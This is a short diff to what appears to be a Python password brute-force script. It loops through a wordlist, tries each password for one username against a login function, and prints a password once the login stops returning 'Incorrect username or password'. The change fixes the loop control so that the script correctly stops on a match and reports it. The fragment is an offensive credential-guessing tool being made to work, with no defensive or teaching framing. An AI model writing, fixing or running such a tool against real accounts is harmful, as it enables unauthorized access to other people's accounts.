@@ -20,14 +20,14 @@ def ayy(username, password):
 
 with open(wordlist,'r') as mariob:
     for passWL in mariob:
-					while found == False:
+					if found == False:
 						for pasw in passWL.split():
 							print("[+++] testing " + usern + ":" + pasw)
 							if ayy(usern, pasw) == "Incorrect username or password":
 								print("[+] Found?: " + str(found))
 								time.sleep(.01)
-						else:
-							pwn = pasw
-							found = True
-							print("[+] Found?: " + str(found) + "| password: " + pasw)
+							else:
+								pwn = pasw
+								found = True
+								print("[+] Found?: " + str(found) + " | password: " + pasw)
 					else: exit()
